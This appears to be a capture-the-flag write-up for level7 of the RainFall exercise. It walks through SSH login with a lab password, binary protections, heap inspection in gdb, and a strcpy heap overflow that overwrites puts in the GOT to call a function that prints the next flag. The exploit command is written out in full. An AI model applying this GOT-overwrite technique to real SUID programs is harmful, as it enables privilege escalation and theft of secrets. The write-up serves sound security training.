login as `level7`

```shell
ssh -p 4242 level7@10.13.100.239
level7@10.13.100.239's password: f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
  GCC stack protector support:            Enabled
  Strict user copy checks:                Disabled
  Restrict /dev/mem access:               Enabled
  Restrict /dev/kmem access:              Enabled
  grsecurity / PaX: No GRKERNSEC
  Kernel Heap Hardening: No KERNHEAP
 System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level7/level7
```

a `SUID` exactable file is locates in the home directory


```shell
level7@RainFall:~$ ./level7
Segmentation fault (core dumped)
level7@RainFall:~$ ./level7 xxx
Segmentation fault (core dumped)
level7@RainFall:~$ ./level7 xxx xxx
~~
level7@RainFall:~$
```

```gdb
(gdb) info functions
...
0x080484f4  m
0x08048521  main
...
```


after inspecting the binary with gdb we find that the main function read the content of
`/home/user/level8/.pass` and stores it in the global variable `c`, the variable `c` in printed inside the `m` function. but not before copying the contents of the first and second program argument to 2 different string pointers within a user defines struct using `strcpy`. the struct is simple containing only a int and a pointer to a string array.


```gdb
(gdb) disas 0x8048400
Dump of assembler code for function puts@plt:
   0x08048400 <+0>:     jmp    *0x8049928
   0x08048406 <+6>:     push   $0x28
   0x0804840b <+11>:    jmp    0x80483a0
End of assembler dump.
```

inspecting the heap after every allocation gives us the following

```gdb
(gdb) x/64wx 0x804a000
0x804a000:      0x00000000      0x00000011      0x00000001      0x0804a018
                  # address of the first struct ^               ^ # the pointer to the string
0x804a010:      0x00000000      0x00000011      0x41414141      0x41414141
                                                ^ # the first string mem address
0x804a020:      0x00000000      0x00000011      0x00000002      0x0804a038
                  # address of the second struct ^               ^ # the pointer to the string
0x804a030:      0x00000000      0x00000011      0x41414141      0x41414141
                                                ^ # the second string mem address
0x804a040:      0x00000000      0x00020fc1      0x00000000      0x00000000
0x804a050:      0x00000000      0x00000000      0x00000000      0x00000000
```

we can exploit the use of `strcpy` by changing the address the that the second struct string is pointing to
into the address of `puts` in the GOT. then we can write into the GOT replacing the address of the `puts` function with the address of the function `m`



```shell
level7@RainFall:~$ ./level7 `python -c "print 'A' * 20 + '\x28\x99\x04\x08'"` `python -c "print '\xf4\x84\x04\x08'"`

5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 - 1746627587
```
